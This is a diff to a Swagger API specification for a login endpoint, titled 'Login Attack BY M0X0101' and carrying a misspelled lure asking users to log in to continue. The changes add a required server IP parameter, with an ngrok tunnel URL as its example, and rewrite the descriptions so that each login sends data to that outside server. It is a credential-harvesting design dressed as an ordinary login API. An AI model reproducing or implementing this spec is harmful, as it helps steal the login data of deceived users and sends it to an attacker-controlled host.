@@ -1,7 +1,7 @@
 swagger: "2.0"
 info:
   title: /*Login Attack BY M0X0101*/ Hello user plese make login blow to contaniue thanks
-  description: An API that allows users to log in to a web application
+  description: An API that allows users to log in to a web application and send data to a server IP address
   version: "1.0"
 
 basePath: /api
@@ -13,7 +13,7 @@ schemes:
 paths:
   /login:
     post:
-      summary: Logs a user in to the web application
+      summary: Logs a user in to the web application and sends data to a server IP address
       consumes:
         - application/json
       produces:
@@ -31,14 +31,25 @@ paths:
           required: true
           schema:
             type: string
+        - name: server_ip
+          in: body
+          description: The IP address of the server to which data will be sent
+          required: true
+          schema:
+            type: string
+            example: https://9eff-174-138-64-216.ngrok.io
       responses:
         200:
-          description: Successful login
+          description: Successful login and data sent to server
           schema:
             type: object
             properties:
               token:
                 type: string
                 description: An authentication token that can be used for subsequent requests
+              message:
+                type: string
+                description: A success message indicating that data has been sent to the server
         400:
-          description: Invalid login credentials
+          description: Invalid login credentials or missing server IP address
+  
